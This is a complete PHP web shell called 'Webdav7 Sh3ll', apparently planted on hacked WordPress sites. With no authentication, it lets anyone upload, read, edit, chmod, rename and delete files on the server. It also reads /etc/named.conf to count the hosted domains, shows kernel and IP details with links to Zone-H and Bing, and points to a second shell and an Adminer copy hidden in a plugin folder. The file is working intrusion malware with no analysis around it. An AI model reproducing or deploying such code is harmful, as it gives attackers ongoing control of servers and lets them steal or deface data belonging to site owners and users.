<?php
error_reporting(0);
@set_time_limit(0);
@session_start();
$server_ip=$_SERVER['SERVER_ADDR'];
$pageURL='http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
$u = explode("/",$pageURL );
$pageURL =str_replace($u[count($u)-1],"",$pageURL );
$site_url=$_SERVER['SERVER_URl'];
$domain_url=$_SERVER['DOMAIN_URl'];
if(strtolower(substr(PHP_OS,0,3)) == "win")
  $os = 'win';
else
  $os = 'nix';
if($GLOBALS['os'] == 'nix') {
        $dominios = @file_get_contents("/etc/named.conf");
        if(!$dominios) {
            $d0c = "CANT READ named.conf";
        } else {
            @preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
            $out = sizeof(array_unique($out[1]));
            $d0c = $out."  Domains";
        }
    } else {
        $d0c = " --- ";
    }
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-859-1" />
<title>Webdav7 Sh3ll</title><link href="https://www.dreuz.info/wp-content/uploads/2018/11/502014285_univ_sqr_xl.jpg" rel='SHORTCUT ICON'/>
<style>
body{
  background:#000;
}
.h1{-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;border:none;font:80px "Iceberg",Helvetica,sans-serif;color:#000;-o-text-overflow:clip;text-overflow:clip;text-shadow: 4px 4px 6px rgba(255,0,0,0.91) , 0 0 20px rgb(254,252,201) , 10px -10px 30px rgb(254,236,133) , -20px -20px 40px rgb(255,174,52) , 20px -40px 50px rgb(236,118,12) , -20px -60px 60px rgb(205,70,6) , 0 -80px 70px rgb(151,55,22) , 10px -90px 80px rgb(69,27,14) }
.style li{display:inline;line-height:35px;list-style:none;margin:0 5px}
.style li a{background-image: -webkit-gradient(
    linear,
    left top,
    left bottom,
    color-stop(0, rgba(255,255,255,.5)),
    color-stop(1, rgba(0,0,0,.1))
  );background-image: -moz-linear-gradient(
    center top,
    rgba(255,255,255,.5) 0%,
    rgba(0,0,0,.1) 100%
  );color:#f4f4f4;color:rgba(255,255,255,.8);display:inline;font:bold 11px "Orbitron","Lucida Grande",Helvetica,Arial,sans-serif;outline:none;padding:5px 15px;text-decoration:none;text-shadow:1px 1px 1px rgba(0,0,0,.4);border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;box-shadow:1px 1px 2px rgba(0,0,0,.65);-moz-box-shadow:1px 1px 2px rgba(0,0,0,.65);-webkit-box-shadow:1px 1px 2px rgba(0,0,0,.65)}
.style li a:active{background-image: -webkit-gradient(
      linear,
      left bottom,
      left top,
      color-stop(0,rgba(255,255,255,.5)),
      color-stop(.1,rgba(255,255,255,.2)),
      color-stop(.85, rgba(0,0,0,.2)),
      color-stop(100, rgba(0,0,0,.4))
    );background-image: -moz-linear-gradient(
      center bottom,
      rgba(255,255,255,.5) 0%,
      rgba(255,255,255,.2) 10%,
      rgba(0,0,0,.2) 85%,
      rgba(0,0,0,.4) 100%
    )}
.red:hover,.red:focus{background-color:#e30606}
#ie{animation:spin 8s linear infinite normal;-moz-animation:spin 8s linear infinite normal;-webkit-animation:spin 8s linear infinite normal}
.green{color: #48ff10;}
.style1 {font-family: BatmanForeverAlternate; font-size: 46px; color: #FFFFFF; 
    color: #f35626;
    background-color: -webkit-linear-gradient(92deg, #f35626, #feab3a);
    -webkit-background-clip: text;
    -webkit-text-fill-color: lavender;
    -webkit-animation: hue 60s infinite linear;}
    @-webkit-keyframes hue {
    from {
      -webkit-filter: hue-rotate(0deg);
    }
    to {
    -webkit-filter: hue-rotate(360deg);
  }
}
}
</style>
</head>
<body>
<div align="center"><br>
  <div class="h1"><p class="style1">Webdav7 Sh3ll</p></div>
  <p class="green"><font color="#ff0000" style="font-size: 10pt">Version du Kernel:</font> <?php echo php_uname(); ?></p>
  <p class="green"><font color="#ff0000" style="font-size: 10pt">Domaines:</font> <?php echo $d0c;?><font color="#ffffff" style="font-size: 10pt">Sites</font> <font color="#ff0000" style="font-size: 10pt">Server IP: </font><?php echo "$server_ip"; echo" <font color='#ff0000' style='font-size: 10pt'>[<a style='text-decoration:none' href='http://bing.com/search?q=ip:".$server_ip."&go=&form=QBLH&filt=all' target='_blank'>Bing Search</a>] <font color='#ff0000' style='font-size: 10pt'>[<a style='text-decoration:none' href='http://zone-h.com/archive/ip=".$server_ip."' target='_blank'>Zone-H</a>]";?></p>
  <?php
  echo '
  <ul class="style">
    <li><a href="'.$site_url.'/wp-content/plugins/widget-logic/file.php" target="_blank" class="red">Anon Shell</a></li>
    <li><a href="'.$site_url.'/wp-content/plugins/widget-logic/adminer.php" target="_blank" class="red">Adminer</a></li>
  </ul>';
?>

<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: black;
color:white;
}
#content tr:hover{
background-color: blue;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: blue;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Upoader Avec Succ�s</font><br />';
}else{
echo '<font color="red">Non Uploader</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Success</font><br/>';
}else{
echo '<font color="red">Change Permission Failed</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Name Change Success</font><br/>';
}else{
echo '<font color="red">Name Change Failed</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Success</font><br/>';
}else{
echo '<font color="red">Edit File Failed</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Deleted</font><br/>';
}else{
echo '<font color="red">Directory Delete Failed                                                                                                                                                                                                                                                                                              </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Deleted</font><br/>';
}else{
echo '<font color="red">File Delete Failed </font><br/>';
}
}
}
echo '</center>';
if(function_exists('opendir')) {
	if($opendir = opendir($path)) {
		while(($readdir = readdir($opendir)) !== false) {
			$scandir[] = $readdir;
		}
		closedir($opendir);
	}
	sort($scandir);
} else {
	$scandir = scandir($path);
}
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="blue">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="blue">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/> P3rt3x L4 D </center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>

</div>
<div align="center"></div>
</body>
</html>
<?php
?>


User01_73r14r4ng